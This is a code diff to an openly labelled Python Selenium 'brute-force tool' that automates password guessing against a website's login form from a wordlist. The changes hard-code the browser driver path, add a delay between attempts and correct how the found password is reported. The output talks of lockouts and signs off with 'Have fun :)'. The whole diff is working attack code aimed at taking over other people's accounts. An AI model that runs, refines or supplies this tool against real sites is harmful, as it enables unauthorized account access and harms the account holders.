@@ -42,7 +42,7 @@ parser.add_option("--website", dest="website",help="choose a website")
 (options, args) = parser.parse_args()
 
 
-
+chromeDriverDIR = 'C:\webdrivers\chromedriver.exe'
 
 def wizard():
     print (banner)
@@ -76,12 +76,12 @@ def wizard():
 
 def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
     f = open(pass_list, 'r')
-    driver = webdriver.Chrome()
+    driver = webdriver.Chrome(chromeDriverDIR)
     optionss = webdriver.ChromeOptions()
     optionss.add_argument("--disable-popup-blocking")
     optionss.add_argument("--disable-extensions")
     count = 1 #count
-    browser = webdriver.Chrome(chrome_options=optionss)
+    browser = webdriver.Chrome(chromeDriverDIR)
     while True:
         try:
             for line in f:
@@ -94,15 +94,17 @@ def brutes(username, username_selector ,password_selector,login_btn_selector,pas
                 # browser.find_element_by_css_selector(username_selector).clear()
                 Sel_user.send_keys(username)
                 Sel_pas.send_keys(line)
+                t.sleep(5)
                 print '------------------------'
                 print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
                 print '------------------------'
+                temp = line 
         except KeyboardInterrupt: #returns to main menu if ctrl C is used
             exit()
         except selenium.common.exceptions.NoSuchElementException:
             print 'AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! '
             print 'LAST PASS ATTEMPT BELLOW'
-            print color.GREEN + 'Password has been found: {0}'.format(line)
+            print color.GREEN + 'Password has been found: {0}'.format(temp)
             print color.YELLOW + 'Have fun :)'
             exit()
 
@@ -119,7 +121,7 @@ banner = color.BOLD + color.RED +'''
   {4}[{5}-{6}]--> {7}coded by Metachar
   {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)
 
-driver = webdriver.Chrome()
+driver = webdriver.Chrome(chromeDriverDIR)
 optionss = webdriver.ChromeOptions()
 optionss.add_argument("--disable-popup-blocking")
 optionss.add_argument("--disable-extensions")
@@ -142,6 +144,3 @@ website = options.website
 pass_list = options.passlist
 print banner
 brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
-
-
-
